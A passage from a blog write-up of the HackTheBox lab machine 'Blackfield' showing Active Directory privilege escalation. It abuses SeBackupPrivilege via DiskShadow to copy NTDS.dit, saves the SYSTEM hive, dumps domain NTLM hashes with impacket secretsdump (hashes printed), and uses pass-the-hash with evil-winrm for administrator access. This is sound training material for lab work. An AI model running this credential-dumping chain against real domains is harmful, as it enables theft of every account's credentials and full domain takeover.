<p><a href="https://pentestlab.blog/tag/diskshadow/">https://pentestlab.blog/tag/diskshadow/</a></p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="c1"># cat jeevan.txt </span>
<span class="no">SET</span> <span class="no">CONTEXT</span> <span class="no">PERSISTENT</span> <span class="no">NOWRITERS</span><span class="c1">#</span>
<span class="n">add</span> <span class="n">volume</span> <span class="ss">c: </span><span class="k">alias</span> <span class="n">jeevan</span><span class="c1">#</span>
<span class="n">createp</span><span class="c1">#</span>
<span class="n">expose</span> <span class="o">%</span><span class="n">jeevan</span><span class="o">%</span> <span class="n">z</span><span class="p">:</span><span class="c1">#</span>
</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; diskshadow /s jeevan.txt
Microsoft DiskShadow version 1.0
Copyright <span class="o">(</span>C<span class="o">)</span> 2013 Microsoft Corporation
On computer:  DC01,  7/11/2020 2:44:35 PM

-&gt; SET CONTEXT PERSISTENT NOWRITERS
-&gt; add volume c: <span class="nb">alias </span>jeevan
-&gt; create
Alias jeevan <span class="k">for </span>shadow ID <span class="o">{</span>64f5cc48-8cd1-4d3a-9393-504db85af469<span class="o">}</span> <span class="nb">set </span>as environment variable.
Alias VSS_SHADOW_SET <span class="k">for </span>shadow <span class="nb">set </span>ID <span class="o">{</span>95cfeba5-f3b5-43bc-ad73-c6bcee2bc475<span class="o">}</span> <span class="nb">set </span>as environment variable.

Querying all shadow copies with the shadow copy <span class="nb">set </span>ID <span class="o">{</span>95cfeba5-f3b5-43bc-ad73-c6bcee2bc475<span class="o">}</span>

        <span class="k">*</span> Shadow copy ID <span class="o">=</span> <span class="o">{</span>64f5cc48-8cd1-4d3a-9393-504db85af469<span class="o">}</span>               %jeevan%
                - Shadow copy <span class="nb">set</span>: <span class="o">{</span>95cfeba5-f3b5-43bc-ad73-c6bcee2bc475<span class="o">}</span>       %VSS_SHADOW_SET%
                - Original count of shadow copies <span class="o">=</span> 1
                - Original volume name: <span class="se">\\</span>?<span class="se">\V</span>olume<span class="o">{</span>351b4712-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\ </span><span class="o">[</span>C:<span class="se">\]</span>
                - Creation <span class="nb">time</span>: 7/11/2020 2:44:35 PM
                - Shadow copy device name: <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: <span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span>
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-&gt; expose %jeevan% z:
-&gt; %jeevan% <span class="o">=</span> <span class="o">{</span>64f5cc48-8cd1-4d3a-9393-504db85af469<span class="o">}</span>
The shadow copy was successfully exposed as z:<span class="se">\.</span>
-&gt;
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\W</span>indows<span class="se">\t</span>emp


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        7/11/2020   2:44 PM            628 2020-07-11_14-44-35_DC01.cab
<span class="nt">-a----</span>        7/11/2020   2:44 PM             90 jeevan.txt
<span class="nt">-a----</span>        7/11/2020   1:13 PM         135470 MpCmdRun.log
<span class="nt">-a----</span>        7/11/2020  12:42 PM            102 silconfig.log
<span class="nt">------</span>        7/11/2020  12:42 PM          63072 vmware-vmsvc.log
<span class="nt">------</span>        7/11/2020  12:43 PM          15832 vmware-vmusr.log
<span class="nt">-a----</span>        7/11/2020  12:42 PM           1728 vmware-vmvss.log


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; 
</code></pre></div></div>

<p>At this point I realised the privs of <code class="language-plaintext highlighter-rouge">svc-backup</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</code></pre></div></div>
<h2 id="to-get-the-ntdsdit-i-need-to-fool-the-system-in-order-to-do-so">To get the <code class="language-plaintext highlighter-rouge">NTDS.dit</code> I need to fool the system in order to do so.</h2>

<p><a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a></p>

<h2 id="after-uploading-both-the-dll-files">After Uploading both the <code class="language-plaintext highlighter-rouge">.dll</code> files.</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; upload SeBackupPrivilegeCmdLets.dll
Info: Uploading SeBackupPrivilegeCmdLets.dll to C:<span class="se">\W</span>indows<span class="se">\t</span>emp<span class="se">\S</span>eBackupPrivilegeCmdLets.dll

                                                             
Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; upload SeBackupPrivilegeUtils.dll
Info: Uploading SeBackupPrivilegeUtils.dll to C:<span class="se">\W</span>indows<span class="se">\t</span>emp<span class="se">\S</span>eBackupPrivilegeUtils.dll

                                                             
Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; 
</code></pre></div></div>
<h2 id="time-to-import-the-modules">Time to import the modules.</h2>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">*Evil-WinRM* PS C:\Windows\temp&gt; import-module .\SeBackupPrivilegeUtils.dll</code>
<code class="language-plaintext highlighter-rouge">*Evil-WinRM* PS C:\Windows\temp&gt; import-module .\SeBackupPrivilegeCmdLets.dll</code></p>
</blockquote>

<h3 id="time-to-copy-ntdsdit">Time to copy <code class="language-plaintext highlighter-rouge">NTDS.dit</code></h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="o">&gt;</span> <span class="no">Copy</span><span class="o">-</span><span class="no">FileSebackupPrivilege</span> <span class="n">z</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="no">NTDS</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="nf">dit</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">ndts</span><span class="p">.</span><span class="nf">dit</span>
<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="o">&gt;</span> <span class="n">ls</span>


    <span class="no">Directory</span><span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span>


<span class="no">Mode</span>                <span class="no">LastWriteTime</span>         <span class="no">Length</span> <span class="no">Name</span>
<span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="no">PM</span>            <span class="mi">628</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11_14</span><span class="o">-</span><span class="mi">44</span><span class="o">-</span><span class="mi">35</span><span class="n">_DC01</span><span class="p">.</span><span class="nf">cab</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="no">PM</span>             <span class="mi">90</span> <span class="n">jeevan</span><span class="p">.</span><span class="nf">txt</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">1</span><span class="p">:</span><span class="mi">13</span> <span class="no">PM</span>         <span class="mi">135470</span> <span class="no">MpCmdRun</span><span class="p">.</span><span class="nf">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">56</span> <span class="no">PM</span>       <span class="mi">18874368</span> <span class="n">ndts</span><span class="p">.</span><span class="nf">dit</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="no">PM</span>          <span class="mi">12288</span> <span class="no">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="nf">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="no">PM</span>          <span class="mi">16384</span> <span class="no">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="nf">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="no">PM</span>            <span class="mi">102</span> <span class="n">silconfig</span><span class="p">.</span><span class="nf">log</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="no">PM</span>          <span class="mi">63072</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmsvc</span><span class="p">.</span><span class="nf">log</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="no">PM</span>          <span class="mi">15832</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmusr</span><span class="p">.</span><span class="nf">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="no">PM</span>           <span class="mi">1728</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmvss</span><span class="p">.</span><span class="nf">log</span>


<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="o">&gt;</span> 

</code></pre></div></div>

<h3 id="file-successfully-copied">File successfully copied…</h3>
<p><code class="language-plaintext highlighter-rouge">-a----        7/11/2020   2:56 PM       18874368 ndts.dit</code></p>

<h3 id="having-only-ntdsdit-is-not-going-to-help-so-i-need-one-more-file-ie-system">Having only <code class="language-plaintext highlighter-rouge">NTDS.dit</code> is not going to help, so i need one more file ie <code class="language-plaintext highlighter-rouge">SYSTEM</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span>\<span class="n">system</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span>\<span class="n">system</span><span class="p">.</span><span class="n">bak</span>
<span class="n">The</span> <span class="n">operation</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>

<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">ls</span>


    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span>


<span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
<span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>            <span class="mi">628</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">11_14</span><span class="o">-</span><span class="mi">44</span><span class="o">-</span><span class="mi">35</span><span class="n">_DC01</span><span class="p">.</span><span class="n">cab</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>             <span class="mi">90</span> <span class="n">jeevan</span><span class="p">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">1</span><span class="p">:</span><span class="mi">13</span> <span class="n">PM</span>         <span class="mi">135470</span> <span class="n">MpCmdRun</span><span class="p">.</span><span class="n">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">56</span> <span class="n">PM</span>       <span class="mi">18874368</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="n">PM</span>          <span class="mi">12288</span> <span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="n">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="n">PM</span>          <span class="mi">16384</span> <span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="n">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="n">PM</span>            <span class="mi">102</span> <span class="n">silconfig</span><span class="p">.</span><span class="n">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">01</span> <span class="n">PM</span>       <span class="mi">17346560</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="n">PM</span>          <span class="mi">63072</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmsvc</span><span class="p">.</span><span class="n">log</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="n">PM</span>          <span class="mi">15832</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmusr</span><span class="p">.</span><span class="n">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="n">PM</span>           <span class="mi">1728</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmvss</span><span class="p">.</span><span class="n">log</span>


<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> 
</code></pre></div></div>
<h3 id="as-ive-got-both-the-required-files-now-its-time-to-download-the-files-to-dump-secrets">As I’ve got both the required files, now its time to download the files to dump <code class="language-plaintext highlighter-rouge">secrets</code>..</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Temp</span><span class="o">&gt;</span> <span class="n">download</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span>
<span class="n">Info</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Temp</span>\<span class="n">ndts</span><span class="p">.</span><span class="n">dit</span> <span class="n">to</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span>

<span class="n">Progress</span><span class="p">:</span> <span class="mi">11</span><span class="o">%</span> <span class="p">:</span> <span class="o">|</span><span class="err">▒░░░░░░░░░</span><span class="o">|</span> 


<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">download</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span>
<span class="n">Info</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span>\<span class="n">system</span><span class="p">.</span><span class="n">bak</span> <span class="n">to</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span>

<span class="n">Progress</span><span class="p">:</span> <span class="mi">6</span><span class="o">%</span> <span class="p">:</span> <span class="o">|</span><span class="err">▒░░░░░░░░░░</span><span class="o">|</span>        
</code></pre></div></div>
<h4 id="wait-till-the-procress-is-completed">Wait till the procress is completed.</h4>

<h2 id="dumping-ntlm">Dumping <code class="language-plaintext highlighter-rouge">NTLM</code></h2>

<h2 id="using-impacket-for-secretdump">Using <code class="language-plaintext highlighter-rouge">impacket</code> for <code class="language-plaintext highlighter-rouge">secretdump</code></h2>

<h3 id="secretsdumppy--ntds-ntdsdit--system-systembak-local"><code class="language-plaintext highlighter-rouge">secretsdump.py -ntds ntds.dit -system system.bak LOCAL</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span>  <span class="o">-</span><span class="n">ntds</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span> <span class="o">-</span><span class="n">system</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span> <span class="n">LOCAL</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="p">.</span><span class="mf">9.22</span><span class="p">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20200611.111621</span><span class="p">.</span><span class="mi">760</span><span class="n">cb1ea</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2020</span> <span class="n">SecureAuth</span> <span class="n">Corporation</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">system</span> <span class="n">bootKey</span><span class="p">:</span> <span class="mh">0x73d83e56de8961ca9f243e1a49638393</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="nc">Credentials </span><span class="p">(</span><span class="n">domain</span>\<span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">pekList</span><span class="p">,</span> <span class="n">be</span> <span class="n">patient</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">PEK</span> <span class="c1"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Reading</span> <span class="ow">and</span> <span class="n">decrypting</span> <span class="n">hashes</span> <span class="k">from</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span> 
<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">184</span><span class="n">fb5e5178480be64824d4cd53b99ee</span><span class="p">:::</span>
<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
<span class="n">DC01</span><span class="err">$</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">65557</span><span class="n">f7ad03ac340a7eb12b9462f80d6</span><span class="p">:::</span>
<span class="n">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">d3c02561bba6ee4ad6cfd024ec8fda5d</span><span class="p">:::</span>
<span class="n">audit2020</span><span class="p">:</span><span class="mi">1103</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">c95ac94a048e7c29ac4b4320d7c9d3b5</span><span class="p">:::</span>
<span class="n">support</span><span class="p">:</span><span class="mi">1104</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">cead107bf11ebc28b3e6e90cde6de212</span><span class="p">:::</span>
<span class="n">BLACKFIELD</span><span class="p">.</span><span class="n">local</span>\<span class="n">BLACKFIELD764430</span><span class="p">:</span><span class="mi">1105</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">a658dd0c98e7ac3f46cca81ed6762d1c</span><span class="p">:::</span>
<span class="n">BLACKFIELD</span><span class="p">.</span><span class="n">local</span>\<span class="n">BLACKFIELD538365</span><span class="p">:</span><span class="mi">1106</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">a658dd0c98e7ac3f46cca81ed6762d1c</span><span class="p">:::</span>
</code></pre></div></div>
<h3 id="time-to-get-root-access">Time to get root access</h3>

<h2 id="getting-roottxt">Getting Root.txt</h2>

<p><code>evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u Administrator -i blackfiled.htb</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">root</span><span class="nd">@Ac3</span><span class="p">:</span><span class="o">~</span><span class="c1"># evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u administrator -i blackfiled.htb
</span>
<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v2</span><span class="p">.</span><span class="mi">3</span>

<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>

<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="p">..</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">Desktop</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
<span class="mi">4375</span><span class="n">a</span><span class="o">------------------------</span><span class="mi">5</span><span class="n">cb</span>
</code></pre></div></div>

<hr />

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'http://localhost:4000/hackthebox/retired/2020/07/11/Blackfield.html';
     this.page.identifier = '/hackthebox/retired/2020/07/11/Blackfield';
     this.page.title = 'Hackthebox Blackfiled';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//bitbrain-github-io.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/otherposts/2020/10/17/OSCP.html">
            My  journey  towards  "TRY  HARDER!"
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hackthebox/retired/2020/07/23/Buff.html">
            HackTheBox Buff
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/tryhackme/2020/07/08/Haskhell.html">
            Tryhackme Haskhell
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/oscp/" class="set-1">OSCP</a> <a href="/tag/tryharder/" class="set-1">TryHarder</a> <a href="/tag/activedirectory/" class="set-3">activedirectory</a> <a href="/tag/analysis/" class="set-1">analysis</a> <a href="/tag/bloodhound/" class="set-1">bloodhound</a> <a href="/tag/bludit/" class="set-1">bludit</a> <a href="/tag/boot2root/" class="set-2">boot2root</a> <a href="/tag/crackmapexec/" class="set-1">crackmapexec</a> <a href="/tag/cve/" class="set-1">cve</a> <a href="/tag/design/" class="set-1">design</a> <a href="/tag/dnspy/" class="set-1">dnspy</a> <a href="/tag/evilwinrm/" class="set-3">evilwinrm</a> <a href="/tag/gobuster/" class="set-4">gobuster</a> <a href="/tag/got/" class="set-1">got</a> <a href="/tag/hashcat/" class="set-2">hashcat</a> <a href="/tag/impacket/" class="set-3">impacket</a> <a href="/tag/introduction/" class="set-1">introduction</a> <a href="/tag/john/" class="set-1">john</a> <a href="/tag/ldapsearch/" class="set-1">ldapsearch</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/lsass/" class="set-1">lsass</a> <a href="/tag/lxd/" class="set-1">lxd</a> <a href="/tag/metasploit/" class="set-2">metasploit</a> <a href="/tag/mimikatz/" class="set-1">mimikatz</a> <a href="/tag/portforwarding/" class="set-1">portforwarding</a> <a href="/tag/review/" class="set-1">review</a> <a href="/tag/rpcclient/" class="set-3">rpcclient</a> <a href="/tag/smb/" class="set-1">smb</a> <a href="/tag/tomcat/" class="set-1">tomcat</a> <a href="/tag/tutorial/" class="set-1">tutorial</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/windows/" class="set-5">windows</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
  




<script>
  let i = 0;
  const text = 'Blackfiled is a HTB active machine at present. This is completely based on enumeration which will lead our way in. This is one of the best windows machine I've enjoyed doing it.';
  const speed = parseInt('70');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

